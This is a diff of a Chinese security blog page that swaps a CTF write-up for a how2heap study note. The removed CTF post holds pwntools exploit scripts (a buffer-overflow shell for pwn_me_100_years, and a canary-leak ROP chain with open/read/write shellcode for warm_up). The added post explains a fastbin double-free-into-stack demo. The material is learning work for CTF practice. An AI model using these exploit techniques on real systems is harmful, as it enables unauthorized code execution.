@@ -1,13 +1,14 @@
 <!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="NJUPT_CTF-WP, Du4t~~~~">
-    <meta name="description" content="hello_pwn提示 Do you know pwntools? 直接用pwntools 连上去就出flag
+    <meta name="keywords" content="how2heap学习笔记, Du4t~~~~">
+    <meta name="description" content="fastbin_dup_into_stack
+虽然这个不是第一个项目 但是是刚刚弄懂的..就赶紧记录下来了
 
-pwn_me_100_years (I)查保护
+案例源码如下
+#include &lt;stdio.h>
+#include &lt;stdlib.h>
 
-拖入IDA 
-
-简单解释下逻辑 就是当0x6010c0地址处的值等于0x66">
+int main(voi">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -15,7 +16,7 @@ pwn_me_100_years (I)查保护
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>NJUPT_CTF-WP | Du4t的博客</title>
+    <title>how2heap学习笔记 | Du4t的博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -306,13 +307,13 @@ pwn_me_100_years (I)查保护
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        NJUPT_CTF-WP
+                        how2heap学习笔记
                     </div>
                 </div>
             </div>
@@ -424,8 +425,8 @@ pwn_me_100_years (I)查保护
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/WP/">
-                                <span class="chip bg-color">WP</span>
+                            <a href="/tags/PWN/">
+                                <span class="chip bg-color">PWN</span>
                             </a>
                         
                     </div>
@@ -436,8 +437,8 @@ pwn_me_100_years (I)查保护
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/WP/" class="post-category">
-                                WP
+                            <a href="/categories/PWN/" class="post-category">
+                                PWN
                             </a>
                         
                     </div>
@@ -448,21 +449,21 @@ pwn_me_100_years (I)查保护
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:  
-                    2019-11-28
+                    2020-01-23
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="far fa-file-word fa-fw"></i>文章字数:  
-                        702
+                        463
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="far fa-clock fa-fw"></i>阅读时长:  
-                        3 分
+                        2 分
                     </div>
                     
                 
@@ -478,96 +479,54 @@ pwn_me_100_years (I)查保护
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <meta name="generator" content="Hexo 3.9.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><h2 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h2><p>提示 <code>Do you know pwntools?</code> 直接用pwntools 连上去就出flag</p>
-<p><img src="https://img02.sogoucdn.com/app/a/100520146/bcfa23648c0d59da32c0ba8b6cdabb1b" alt></p>
-<h2 id="pwn-me-100-years-I"><a href="#pwn-me-100-years-I" class="headerlink" title="pwn_me_100_years (I)"></a>pwn_me_100_years (I)</h2><p>查保护</p>
-<p><img src="https://img02.sogoucdn.com/app/a/100520146/8b83de84ae8ec07b01a461bfc7746ceb" alt></p>
-<p>拖入IDA </p>
-<p><img src="https://img02.sogoucdn.com/app/a/100520146/fd12eb6966aaf380b23c0e35c74436b3" alt></p>
-<p>简单解释下逻辑 就是当0x6010c0地址处的值等于0x66666666时 程序将打开一个shell 程序前面只有一个read 双击s1 发现s1是和0x6010c0相邻 </p>
-<p><img src="https://img02.sogoucdn.com/app/a/100520146/b545d90d71a0962f0619621cd50ffbe2" alt></p>
-<p>可以观察到 s1到达目标0x6010c0只差0x10 而read可以读进0x20个字符 则我们可以覆盖过去 但是程序将我们输入的字符和<code>yes</code>进行了比较 如果等于yes 才能程序才会继续进行判断 但是strcmp函数判断字符串的方式是通过字符串结尾的\x00 来判断字符串是否结尾的 那手动输入一个\x00 让strcmp认为字符串结束就可以绕过了</p>
-<p>脚本如下</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+                <meta name="generator" content="Hexo 3.9.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><h2 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h2><blockquote>
+<p>虽然这个不是第一个项目 但是是刚刚弄懂的..就赶紧记录下来了</p>
+</blockquote>
+<p>案例源码如下</p>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdlib.h></span></span>
 
-sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"139.129.76.65"</span><span class="token punctuation">,</span><span class="token string">"50004"</span><span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"are you ready?"</span><span class="token punctuation">)</span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> size<span class="token punctuation">;</span>
+    <span class="token keyword">int</span> <span class="token operator">*</span>a<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> <span class="token operator">*</span>b<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> <span class="token operator">*</span>c<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a:%p\n"</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"b:%p\n"</span><span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"c:%p\n"</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"size:%p\n"</span><span class="token punctuation">,</span><span class="token operator">&</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"free a\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"free b\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">free</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"free a\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    size<span class="token operator">=</span><span class="token number">0x21</span><span class="token punctuation">;</span>
+    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>d<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token operator">*</span>d<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&</span>size<span class="token operator">-</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> <span class="token operator">*</span>e<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> <span class="token operator">*</span>f<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> <span class="token operator">*</span>g<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"d:%p\n"</span><span class="token punctuation">,</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"e:%p\n"</span><span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"f:%p\n"</span><span class="token punctuation">,</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"g:%p\n"</span><span class="token punctuation">,</span>g<span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-payload<span class="token operator">=</span><span class="token string">'yes'</span><span class="token operator">+</span><span class="token string">'\x00'</span><span class="token operator">+</span><span class="token string">'ffff'</span><span class="token operator">*</span><span class="token number">5</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
 
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
-<p>运行即可getshell</p>
-<p><img src="https://img04.sogoucdn.com/app/a/100520146/a10722822f0bbdb83531695cc2cb811f" alt></p>
-<h2 id="warm-up"><a href="#warm-up" class="headerlink" title="warm_up"></a>warm_up</h2><p>查保护</p>
-<p><img src="https://img04.sogoucdn.com/app/a/100520146/638a24772c7f4f3ef3f36972c873eaca" alt></p>
-<p>载入IDA 发现程序加了白名单 禁止掉了execve 那肯定就不能开个shell了 只能使用orw[open,read,write] 来读取flag了 </p>
-<p><img src="https://img03.sogoucdn.com/app/a/100520146/68b021fd58cf57e6109016f479acacef" alt></p>
-<p>这里明显存在栈溢出 那么就是正常rop的流程 肯定还是要先泄漏出来canary的值和libc版本 然后使用mprotect函数 使bss段可执行 再将open(“./flag”) read(3,bss_addr,0x100) write(1,bss_addr,0x100) 写到bss段上 最后跳转执行即可 脚本如下</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span>  pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-
-context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
-<span class="token comment" spellcheck="true"># sh=remote("139.129.76.65","50007")</span>
-sh<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./warm_up"</span><span class="token punctuation">)</span>
-libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"libc6_2.27-3ubuntu1_amd64.so"</span><span class="token punctuation">)</span>
-file<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./warm_up"</span><span class="token punctuation">)</span>
-puts_plt<span class="token operator">=</span>file<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
-puts_got<span class="token operator">=</span>file<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
-read_got<span class="token operator">=</span>file<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
-main_addr<span class="token operator">=</span><span class="token number">0x400ab6</span>
-pop_rdi_addr<span class="token operator">=</span><span class="token number">0x0000000000400bc3</span>
-bss_addr<span class="token operator">=</span><span class="token number">0x000000000601000</span><span class="token operator">+</span><span class="token number">0x300</span>
-
-sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"warm up!!!"</span><span class="token punctuation">)</span>
-payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span>
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">)</span>
-canary<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x0a</span>
-log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'canary:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"?"</span><span class="token punctuation">)</span>
-payload2<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
-<span class="token comment" spellcheck="true"># sh.interactive()</span>
-puts_got<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"puts_got:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token punctuation">)</span>
-libc_base<span class="token operator">=</span>puts_got<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
-log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"libc_base:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
-sys_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
-log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"sys_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
-bin_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>
-log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"bin_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>bin_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
-open_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'open'</span><span class="token punctuation">]</span>
-log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'open_addr:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>open_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
-write_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
-log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"write_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
-read_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
-log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"read_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
-mprotect<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span>
-log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"mprotect:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>mprotect<span class="token punctuation">)</span><span class="token punctuation">)</span>
-log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"bss_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-pop_rdx_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x0000000000001b96</span>
-log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"pop_rdx_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>pop_rdx_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
-pop_rsi_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x0000000000023e6a</span>
-log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"pop_rsi_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>pop_rsi_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-<span class="token comment" spellcheck="true"># sh.interactive()</span>
-sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"warm up!!!"</span><span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"?"</span><span class="token punctuation">)</span>
-payload3<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x1500</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdx_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span>
-payload3<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdx_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload3<span class="token punctuation">)</span>
-
-read_flag<span class="token operator">=</span>shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">"./flag"</span><span class="token punctuation">)</span>
-read_flag<span class="token operator">+=</span>shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>bss_addr<span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span>
-read_flag<span class="token operator">+=</span>shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>bss_addr<span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>read_flag<span class="token punctuation">)</span>
-
-sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
-<p>即使使用了本地的libc版本依旧跑不通 很是郁闷</p>
-<h2 id="pwn-me-100-years-II"><a href="#pwn-me-100-years-II" class="headerlink" title="pwn_me_100_years (II)"></a>pwn_me_100_years (II)</h2><p>有些问题 以后补上</p>
+<span class="token punctuation">}</span></code></pre>
+<p>阅读源码可以知道 首先有一个<code>double free</code>漏洞 这样在fastbin中chuck a和chuck b的fd指针都指向彼此 这样就会形成一个死循环 无论怎么重新<code>malloc</code>申请堆块 只要size一样 申请出来的都是chuck a和chuck b且交替出现</p>
+<p>此时<code>double free</code>后fastbin中两个chuck的状态</p>
+<p><img src="https://s2.ax1x.com/2020/01/24/1V4b7Q.png" alt="1V4b7Q.png"></p>
+<p>然后将局部变量<code>size</code>的值修改为0x21也就是chuck a的size字段的值 同时重新申请chuck a然后将其fd指针覆盖为栈上的数据 因为glibc在分配内存时只会验证size字段是否符合 这样的话 如果我们继续申请堆块 那么下个堆块就应该是在栈上</p>
+<p>覆盖fd指针后</p>
+<p><a href="https://imgchr.com/i/1V5FAJ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/01/24/1V5FAJ.md.png" alt="1V5FAJ.md.png"></a></p>
+<blockquote>
+<p>不是申请了chuck a么 为什么其fd指针仍然生效</p>
+<p>这是因为在fastbin中未分配的chuck b fd指针仍然指向chuck a这样chuck a在glibc看来就仍然是未分配的堆块 如上图</p>
+</blockquote>
+<p>这样操作就可以通过<code>double free</code>拿到栈上一个指针 </p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -744,8 +703,8 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
                 </a>
             </div>
             <br>
-            <a href="/2019/11/28/njupt-ctf/">
-                    《NJUPT_CTF-WP》
+            <a href="/2020/01/23/how2heap-xue-xi-bi-ji/">
+                    《how2heap学习笔记》
             </a> 由
             <a href="http://Du4t.github.io">
                 Du4t
@@ -788,33 +747,35 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i> 上一篇</div>
+                <i class="fas fa-chevron-left"></i> 本篇
+            </div>
             <div class="card">
-                <a href="/2019/12/07/ji-yu-mou-ctf-ti-de-ge-shi-hua-zi-fu-chuan-lou-dong-zai-xue-xi/">
+                <a href="/2020/01/23/how2heap-xue-xi-bi-ji/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="基于某CTF题的格式化字符串漏洞再学习">
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="how2heap学习笔记">
                         
-                        <span class="card-title">基于某CTF题的格式化字符串漏洞再学习</span>
+                        <span class="card-title">how2heap学习笔记</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            最近在做SWPUCTF 发现PWN题又出现了利用格式化字符串漏洞修改值 决定彻底总结下格式化字符串漏洞
-漏洞成因
-这里给出本模块的实验案例
+                            fastbin_dup_into_stack
+虽然这个不是第一个项目 但是是刚刚弄懂的..就赶紧记录下来了
+
+案例源码如下
 #include <stdio.h>
-int main(void)
-{
-   char a[1
+#include <stdlib.h>
+
+int main(voi
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2019-12-07
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-01-23
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -827,6 +788,7 @@ int main(void)
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -845,35 +807,32 @@ int main(void)
                 下一篇 <i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/11/16/rop-ji-zhu/">
+                <a href="/2020/01/18/duan-kou-sao-miao-jiao-ben/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="ROP技术">
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="端口扫描脚本">
                         
-                        <span class="card-title">ROP技术</span>
+                        <span class="card-title">端口扫描脚本</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
-学习ROP技术需要略微一点的plt和got表的知识以及汇编层面函数调用的知识
-
-什么是ROP在编程过程中 有面向过程编程(POP) 有面向对象编程(OOP) 而在PWN中 有一种技术叫做面向返回编程 即ROP 
-ROP存在的价值就是 当我
+                            ReadmePython小工具第二弹???这次脚本终于优化了传参方式..使用了optparse这个库进行传参 具体的端口扫描功能实现是利用socket库实现的 中间排bug排的快死了..
+端口扫描脚本 V1.0# -*- coding: u
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2019-11-16
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-01-18
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/PWN/" class="post-category">
-                                    PWN
+                            <a href="/categories/Others/" class="post-category">
+                                    Others
                                 </a>
                             
                             
@@ -883,8 +842,8 @@ ROP存在的价值就是 当我
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/PWN/">
-                        <span class="chip bg-color">PWN</span>
+                    <a href="/tags/Others/">
+                        <span class="chip bg-color">Others</span>
                     </a>
                     
                 </div>
